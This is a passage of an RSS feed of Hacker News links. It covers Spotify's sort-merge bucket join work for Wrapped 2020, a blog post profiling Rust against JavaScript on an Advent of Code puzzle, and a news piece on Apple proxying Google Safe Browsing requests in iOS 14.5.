<figure><img loading="lazy" width="700" height="459" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-700x459.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-700x459.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-250x164.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-768x504.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-120x79.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3.png 1115w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<ul><li><strong>SortedBucketTransform:</strong> A common usage pattern is for pipelines to enrich an existing dataset by joining it with one or more other sources, then writing it to an output location. We decided to specifically support this in SMB with a unique PTransform that reads, transforms, and writes output using the same keying and bucketing scheme. By doing the read/transform/write logic per bucket on the same worker, we can avoid having to reshuffle the data and recompute buckets — since the key is the same, we know that the transformed elements from bucket M of the inputs also correspond to bucket M in the output, in the same sorted order as they were read from.</li></ul>



<figure><img loading="lazy" width="700" height="320" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-700x320.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-700x320.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-250x114.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-768x351.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-120x55.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4.png 902w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<ul><li><strong>External Sort:</strong> We made a number of improvements to Beam’s <a href="https://github.com/apache/beam/tree/master/sdks/java/extensions/sorter">external sorter extension</a>, including replacing the Hadoop sequence file with the native file I/O, removing the 2GB memory limit, and reducing disk usage and coder overhead.</li></ul>



<h2>Adoption — Core Data Producers</h2>



<p>Since SMB requires data to be bucketed and sorted in a specific fashion, the adoption naturally starts from the producer of that data. A majority of the Spotify data processing relies on a few core data sets that act as single sources of truth for various business domains like streaming activities, user metadata and streaming context. We worked with the maintainer of these data sets to convert a year’s worth of data to SMB format.</p>



<p>Implementation was straightforward since SortedBucketSink is mostly a drop-in replacement for the vanilla Avro sink with some extra settings. We were using Avro sink with the sharding option to control the number and size of output files. After migrating to SMB, we did not notice any major bump in terms of vCPU, vRAM, or wall time since sharding requires a full shuffle similar to the additional cost of SMB sinks. A few other settings we have since had to tweak:</p>



<ul><li>Agree on user_id as a hexadecimal string as bucket and sort key, since we need the same key type and semantic across all SMB datasets.</li><li>Set compression to DEFLATE with level 6 to be consistent with the default Avro sink in Scio. As a nice side effect of data being bucketed and sorted by key, we observed ~50% reduction in storage from better compression due to collocation of similar records.</li><li>Make sure output files are backwards compatible. SMB output files have “bucket-X-shard-Y” in their names but otherwise contain the same records with the same schema. So existing pipelines can consume them without any code change; they just do not leverage the speedup in certain join cases.</li></ul>



<h2>Adoption — Wrapped 2020</h2>



<p>Once the core datasets were available in SMB format, we …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020">https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020</a></em></p>]]>
            </description>
            <link>https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111993</guid>
            <pubDate>Fri, 12 Feb 2021 09:44:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Performance Showdown: Rust vs Javascript (2020)]]>
            </title>
            <description>
<![CDATA[
Score 98 | Comments 101 (<a href="https://news.ycombinator.com/item?id=26111387">thread link</a>) | @KingOfCoders
<br/>
February 11, 2021 | https://cesarvr.io/post/rust-performance/ | <a href="https://web.archive.org/web/*/https://cesarvr.io/post/rust-performance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After spending some weeks playing with Rust, I felt ready to test my skills and try some programming challenges in the <a href="https://adventofcode.com/">Advent Of Code</a>. My approach to tackle some of those challenges was to solve them using Javascript (I use it in my day to day) first and then port the code to Rust. While writing the port I just focus on getting the Rust code as elegant as possible to achieve that I research the Rust API's to get syntactically correct. It was after finishing porting this <a href="https://adventofcode.com/2018/day/5">puzzle</a> in particular and feeling a sense of accomplishment that I decided to test how the Rust compiled code will perform against Javascript interpreter.</p><h2 id="naive-algorithm">Naive Algorithm</h2><hr><p>Before jumping to the whom-was-slower-and-why, let’s take a quick look at <a href="https://adventofcode.com/2018/day/5">puzzle</a> (so you see there is no hidden agenda) which goes like this:</p><p>You are given an input string with <code>N</code> amount of characters and we should write an algorithm that find and remove any sequential pairs of characters that similar but have different capitalisation, examples of this are:</p><div><pre><code data-lang="sh">bB <span># Remove</span>
bb <span># Do Nothing</span>
ab <span># Do Nothing</span>
</code></pre></div><p>The algorithm should re-evaluate the string recursively searching for new pairs created after the removal, something like tetris.</p><p>We have this input:</p><p>We should remove <code>bB</code> to get:</p><p>Then because <code>aA</code> has been formed we should eliminated this too:</p><p>Then we remove <code>dD</code> and the final string should be:</p><h3 id="my-solution">My Solution</h3><p>To solve this I wrote two functions, one that <code>process</code> takes array of characters, traverse the array a pair at a time and validate that they follow the rules mentioned above:</p><h4 id="rust">Rust</h4><hr><div><pre><code data-lang="rust"><span>fn</span> <span>process</span>(tokens: <span>&amp;</span><span>mut</span> Vec<span>&lt;</span>String<span>&gt;</span>) -&gt; <span>i32</span> {
  <span>let</span> <span>mut</span> polymer: Vec<span>&lt;</span>String<span>&gt;</span> <span>=</span> Vec::new();

  <span>while</span> <span>let</span> Some(token) <span>=</span> tokens.pop() {
      <span>if</span> polymer.is_empty() {
          polymer.push(token);
          <span>continue</span>;
      }

      <span>let</span> candidate <span>=</span> polymer.pop().unwrap();

      <span>if</span> <span>!</span>react(<span>&amp;</span>candidate, <span>&amp;</span>token) {
          polymer.push(candidate.to_string());
          polymer.push(token.to_string());
      }
  }

  polymer.len() <span>as</span> <span>i32</span>
}
</code></pre></div><h4 id="javascript">Javascript</h4><hr><div><pre><code data-lang="js"><span>function</span> <span>process</span>(<span>data</span>) {
  <span>let</span> <span>queue</span> <span>=</span> []  <span>// Save here tested characters.
</span><span></span>
  <span>while</span>(<span>data</span>.<span>length</span> <span>&gt;</span> <span>0</span>) {
    <span>let</span> <span>candidate_1</span> <span>=</span> <span>data</span>.<span>pop</span>()
    <span>let</span> <span>candidate_2</span> <span>=</span> <span>queue</span>.<span>pop</span>() <span>// get the last character that passed the test.
</span><span></span>
    <span>if</span> (<span>candidate_2</span> <span>===</span> <span>undefined</span>) {
      <span>queue</span>.<span>push</span>(<span>candidate_1</span>)
      <span>continue</span>
    }

    <span>let</span> <span>react</span> <span>=</span> <span>reacting</span>(<span>candidate_1</span>, <span>candidate_2</span>)

    <span>if</span>(<span>!</span><span>react</span>) {
      <span>queue</span>.<span>push</span>(<span>candidate_2</span>)
      <span>queue</span>.<span>push</span>(<span>candidate_1</span>)
    }
  }

  <span>return</span> <span>result</span>.<span>length</span>
}

</code></pre></div><blockquote><p><em>Notice</em> the <em>performance</em> optimization by keeping the last character in a different queue, that way we don’t need to traverse the whole array looking for matches after a previous removal.</p></blockquote><p>Then each pair of characters is evaluated using a function called <code>react</code> that returns <code>true</code> or <code>false</code> if the pair need to be removed:</p><h4 id="rust-1">Rust</h4><hr><div><pre><code data-lang="rust">
  <span>fn</span> <span>react</span>(token1: <span>&amp;</span>String, token2: <span>&amp;</span>String) -&gt; <span>bool</span> {
    <span>if</span> token1.to_lowercase() <span>=</span><span>=</span> token2.to_lowercase() {
        <span>return</span> token1 <span>!</span><span>=</span> token2
    }

    <span>false</span>
  }
</code></pre></div><h4 id="javascript-1">Javascript</h4><hr><div><pre><code data-lang="js"><span>function</span> <span>react</span>(<span>candidate_1</span>, <span>candidate_2</span>) {
  <span>if</span> (<span>candidate_1</span>.<span>toLowerCase</span>() <span>===</span> <span>candidate_2</span>.<span>toLowerCase</span>()) {
    <span>if</span> ( <span>candidate_1</span> <span>!==</span> <span>candidate_2</span> ) {
      <span>return</span> <span>true</span>
    }
  }

  <span>return</span> <span>false</span>
}
</code></pre></div><blockquote><p>Basically is a rudimentary implementation of an <strong>equals-ignore-case</strong> plus an additional check to see if they are they same character (the same capitalization).</p></blockquote><p>To complete the challenge each version (Rust, Javascript) needs to reduce a large string (<a href="https://adventofcode.com/2018/day/5/input">50K character</a>) which is good enough to test how well one version performs against the other, then I run each code using Linux <code>time</code> and got this:</p><div><pre><code data-lang="python"><span># Javascript (Node.js)</span>
  real  <span>0</span>m0<span>.</span><span>374</span>s
  user  <span>0</span>m0<span>.</span><span>301</span>s
  sys   <span>0</span>m0<span>.</span><span>030</span>s

<span># Rust</span>
  real  <span>0</span>m0<span>.</span><span>720</span>s
  user  <span>0</span>m0<span>.</span><span>636</span>s
  sys   <span>0</span>m0<span>.</span><span>012</span>s
</code></pre></div><p>This is a surprising turn of events, here we can see the Rust version is <code>2x</code> slower than Javascript, How? My first reaction (in an act of self denial) was to check the compiler flags <code>opt-level</code> and after checking that was fine, which to be honest won’t make a difference, I started to look for inefficiencies in the code, first using the ancient <a href="http://www.brendangregg.com/methodology.html">Drunk man anti-method</a> technique and when that didn’t work, I end up settling for a more scientific method of profiling my code with <a href="https://perf.wiki.kernel.org/index.php/Main_Page">perf</a>.</p><h2 id="debugging">Debugging</h2><hr><p>Every time you are debugging a performance issues you might feel tempted to start adding your own function to calculate the duration of suspicious section of code (like I used to do, in the past). <a href="http://www.brendangregg.com/perf.html">Perf</a> does this for you by taking various approaches such as listening to CPU/Kernel <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/developer_guide/perf">performance events</a> metrics emitted by the system in reaction of your process while running. Things like this makes perf the tool of choice to debug performance issues, so let’s see how it works.</p><h3 id="debugging-symbols">Debugging Symbols</h3><p>Before we start we need to enable the <a href="http://carol-nichols.com/2015/12/09/rust-profiling-on-osx-cpu-time/">debugging symbols</a> on the Rust compiler, this will make <code>perf</code> reports more informative. To enable this add <code>debug=true</code> to the <code>Cargo.toml</code>:</p><div><pre><code data-lang="toml">[<span>profile</span>.<span>release</span>]
<span>opt</span><span>-</span><span>level</span> = <span>3</span>
<span>debug</span>=<span>true</span>
</code></pre></div><h3 id="attaching-perf">Attaching Perf</h3><p>I recompiled the code and attached <code>perf</code>:</p><div><pre><code data-lang="zsh">cargo build
./target/release/day-5 &amp; perf record -F <span>99</span> -p <span>`</span>pgrep day-5<span>`</span>
</code></pre></div><ul><li>First we run the Rust program (<code>day-5</code>) and we send it to the background using the ampersand (<code>&amp;</code>) symbol.</li><li>Next to it, so it executes immediately, we run <code>perf</code> that receives the process identifier (<a href="https://en.wikipedia.org/wiki/Process_identifier">PID</a>) courtesy of <code>pgrep day-5</code>.</li><li>The <a href="https://linux.die.net/man/1/pgrep">pgrep</a> command returns the <a href="https://en.wikipedia.org/wiki/Process_identifier">PID</a> of a process by name.</li></ul><p>Here is the output:</p><div><pre><code data-lang="bash"><span>[</span>1<span>]</span> <span>27466</span>
sample size <span>50003</span>
--
solution 1: <span>9526</span>
solution 2: <span>6694</span>


<span>[</span> perf record: Woken up <span>1</span> times to write data <span>]</span>
<span>[</span>1<span>]</span>  + <span>27466</span> <span>done</span>       ./target/release/day-5
<span>[</span> perf record: Captured and wrote 0.002 MB perf.data <span>(</span><span>13</span> samples<span>)</span> <span>]</span>
</code></pre></div><h3 id="report">Report</h3><p>After running this multiple times,<code>perf</code> automatically aggregates the data to a report file (<code>perf.data</code>) in the same folder where we are making the call.</p><p>Now we can visualise the report with:</p><p><img src="https://raw.githubusercontent.com/cesarvr/hugo-blog/master/static/rust/perf-1.png" alt=""></p><p>Interestingly the algorithm spend <strong>30 percent</strong> of the time in the <a href="https://doc.rust-lang.org/std/string/struct.String.html#method.to_lowercase">String::to_lowercase</a> which is suspicious:</p><div><pre><code data-lang="rust"><span>fn</span> <span>react</span>(token1: <span>&amp;</span>String, token2: <span>&amp;</span>String) -&gt; <span>bool</span> {
    <span>if</span> token1.to_lowercase() <span>=</span><span>=</span> token2.to_lowercase() {  <span>// 30% CPU wasted here
</span><span></span>        <span>return</span> token1 <span>!</span><span>=</span> token2
    }

    <span>false</span>
}
</code></pre></div><p>My first impression is that I made a mistake while running <code>perf</code> (never used it before with Rust), but everything started to make sense once I looked at the source code of the <a href="https://doc.rust-lang.org/std/string/struct.String.html#method.to_lowercase">to_lowercase</a> function.</p><p>What happen is that Rust lowercase function try to be correct in any language, so it delegates this conversion to a function called <a href="https://doc.rust-lang.org/1.29.2/std_unicode/conversions/fn.to_lower.html">std_unicode::conversions</a> this function then does a <a href="https://en.wikipedia.org/wiki/Binary_search_algorithm">binary search</a> of each character against a big array (≈1200) of unicode characters:</p><div><pre><code data-lang="rust">
<span>const</span> to_lowercase_table: <span>&amp;</span>[(char, [char; <span>3</span>])] <span>=</span> <span>&amp;</span>[
        (<span>'\u{41}'</span>, [<span>'\u{61}'</span>, <span>'\0'</span>, <span>'\0'</span>]),
        (<span>'\u{42}'</span>, [<span>'\u{62}'</span>, <span>'\0'</span>, <span>'\0'</span>]),
        (<span>'\u{43}'</span>,<span>//...≈1200 ]
</span><span></span>

 <span>pub</span> <span>fn</span> <span>to_lower</span>(c: <span>char</span>) -&gt; [char; <span>3</span>] {
        <span>match</span> bsearch_case_table(c, to_lowercase_table) {
            None        <span>=</span><span>&gt;</span> [c, <span>'\0'</span>, <span>'\0'</span>],
            Some(index) <span>=</span><span>&gt;</span> to_lowercase_table[index].<span>1</span>,
        }
    }

</code></pre></div><blockquote><p>Going back at the code, this binary search is done twice per iteration now multiply this by <code>50K</code> and we found the reason for the slow down.</p></blockquote><p>After some googling I found that I should use <a href="https://doc.rust-lang.org/src/core/str/mod.rs.html#4006">eq_ignore_ascii_case</a> instead, which basically makes this operation in <a href="https://doc.rust-lang.org/1.37.0/src/core/slice/mod.rs.html#2487">linear time</a> and for one character is nearly the same as saying constant time. I recompiled the code and run the benchmarks:</p><div><pre><code data-lang="xml">Node.JS
real  0m0.374s
user  0m0.301s
sys   0m0.030s

Rust
real  0m0.283s
user  0m0.248s
sys   0m0.005s
</code></pre></div><p>Now we are talking, profiling has pay its dividends and made the Rust program <code>2.5x</code> <em>faster</em> than the original and <code>91ms</code> faster than the Javascript version, I can start celebrating and telling my friends that I’m a Rust expert now. But this leaves me with some questions:</p><blockquote><p>The <code>91ms</code> is not bad, but I wonder how much effort it will take to optimize this code to make it <code>&gt;1.5x</code> faster than the Javascript counterpart?</p></blockquote><h2 id="performance-on-macos">Performance On MacOS</h2><p>While I was thinking of this and was in the middle of unpacking my Rust stickers and preparing my laptop for some re-branding, I decided to move the code (Javascript and Rust) from my Linux VM to my main OS (<strong>MacOS Catalina</strong>), once there I gave the benchmark another try because I <em>love</em> suffering:</p><div><pre><code data-lang="sh">Node   0.17s user 0.03s system 101% cpu 0.209 total
Rust   0.23s user 0.01s system 98% cpu 0.238 total
</code></pre></div><p>After seeing this my confidence in my time measuring tool (<code>time</code>) started to fade a bit, but once I calm down and use the <a href="https://developer.apple.com/library/archive/documentation/AnalysisTools/Conceptual/instruments_help-collection/Chapter/Chapter.html">XCode Instrumentation</a> which point me in the right direction:</p><p><img src="https://github.com/cesarvr/hugo-blog/blob/master/static/rust/malloc-xcode-2.png?raw=true" alt=""></p><blockquote><p>The slowest part of the program (Rust version) is the part that does the allocation and deallocation of memory produced when calling MacOS <code>malloc</code>.</p></blockquote><p>To catch this one I'll need to dig more into Rust inner workings. Does this make it more expensive to get performance out of Rust? Did I choose the wrong abstractions? That's for another post. If you want to take a look at the code yourself here is the <a href="https://github.com/cesarvr/AOCRust/tree/master/day-5">Rust</a> and <a href="https://github.com/cesarvr/AOCRust/tree/master/JS">JS</a>, if you have any improvement, idea, suggestions or performance trick let me know by <a href="https://twitter.com/cvaldezr">Twitter</a>, <a href="https://github.com/cesarvr/AOCRust">pull request</a> or <a href="https://github.com/cesarvr/hugo-blog/issues">open an issue</a>.</p></div></div>]]>
            </description>
            <link>https://cesarvr.io/post/rust-performance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111387</guid>
            <pubDate>Fri, 12 Feb 2021 07:19:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple redirects Google Safe Browsing traffic through proxy servers in iOS 14.5]]>
            </title>
            <description>
<![CDATA[
Score 379 | Comments 258 (<a href="https://news.ycombinator.com/item?id=26110928">thread link</a>) | @CharlesW
<br/>
February 11, 2021 | https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/ | <a href="https://web.archive.org/web/*/https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>

<p><strong>Update 1:58 AM PT:</strong> <em>Updated the post to clear confusion about how Google’s Safe Browsing feature works.</em></p>
<hr>
<p>Apple’s privacy push is much more widespread than it seems at the surface. A perfect example is the new privacy feature in <a href="https://the8-bit.com/ios-14-5-changes/">iOS 14.5 Beta 1 (V2)</a> which redirects Google Safe Browsing traffic through Apple’s own proxy servers to enhance users’ privacy and to not let Google see your IP address. </p>
<p>Google Safe Browsing is a security service created by Google that checks whether a website is malicious. When you access a website on the desktop version of Chrome on your Mac or PC, for instance, Google Safe Browsing checks if a website is safe to browse and displays a warning accordingly. The user ultimately has the choice, however.</p>
<p>As Reddit user u/jaydenkieran explains, Apple uses Google Safe Browsing when you enable “Fraudulent Website Warning” within the Safari settings in the Settings app on iPhone or iPad.</p>
<p><a aria-label="According to Google (opens in a new tab)" href="https://support.google.com/transparencyreport/answer/7380435?hl=en#zippy=%2Chow-do-you-determine-that-a-site-is-unsafe" target="_blank" rel="noreferrer noopener">According to Google</a>, its Safe Browsing system works by scanning sections of Google’s web index and “identifying potentially compromised websites.” Then, Google tests those websites by using a virtual machine to check if the website compromises the system. If it does, it’s added to Google’s online database. Google also identifies phishing websites by using statistical models. </p>
<p><a aria-label="According to Apple (opens in a new tab)" href="https://support.apple.com/en-ae/HT210675" target="_blank" rel="noreferrer noopener">According to Apple</a>, before visiting a website, Safari may send hashed prefixes of the URL (Apple terms it “information calculated from the website address”) to Google Safe Browsing to check if there’s a match. </p>
<p>Since Apple uses a hashed prefix, Google cannot learn which website the user is trying to visit. Up until iOS 14.5, Google could also see the IP address of where that request is coming from. However, since Apple now proxies Google Safe Browsing traffic, it further safeguards users’ privacy while browsing using Safari.</p>
<p>Apple has been intensifying its push for privacy with iOS 14 what with the <a href="https://the8-bit.com/app-tracking-transparency-guide/">App Tracking Transparency update and the inclusion of App Privacy Reports in the App Store</a>. </p><div><p>See also</p><div id="block-wrap-39225" data-id="39225" data-base="0"><div><div><div><article><div><p><a href="https://the8-bit.com/siri-now-allows-setting-a-default-music-streaming-service-on-ios-14-5/" title="Siri_Default_Music_App"><img width="100" height="100" src="https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-100x100.jpg" alt="Siri Default Music App" srcset="https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-100x100.jpg 100w, https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-80x80.jpg 80w, https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-293x293.jpg 293w" sizes="(max-width: 100px) 100vw, 100px"></a></p></div></article></div></div></div></div></div>
<p>At the same time, companies like Facebook are actively opposing the Cupertino giant, accusing it of negatively affecting the advertising industry. Apple’s response has been simple: </p>
<p>“We believe that this is a simple matter of standing up for our users. Users should know when their data is being collected and shared across other apps and websites — and they should have the choice to allow that or not. App Tracking Transparency in iOS 14 does not require Facebook to change its approach to tracking users and creating targeted advertising, it simply requires they give users a choice.” </p>
<p>Google itself <a href="https://appleinsider.com/articles/21/02/04/google-still-hasnt-updated-its-ios-apps-while-pondering-android-privacy-controls" target="_blank" aria-label="had been holding off (opens in a new tab)" rel="noreferrer noopener">had been holding off</a> on updating its host of apps on the App Store due to the App Privacy Health Reports in the App Store that lets users view how an app tracks them. However, Google later disclosed that it will update its apps to include as little tracking as possible.</p>
<p>Having said that, it’s interesting to see Apple focus on enhancing user privacy as much as they can. And setting up a proxy server to filter Google Safe Browsing traffic just so Google cannot see users’ browsing activity will be a welcome move for a lot of users.</p>
</div><!-- .entry-content -->
</div></div>]]>
            </description>
            <link>https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26110928</guid>
            <pubDate>Fri, 12 Feb 2021 05:07:03 GMT</pubDate>
        </item>
    </channel>
</rss>
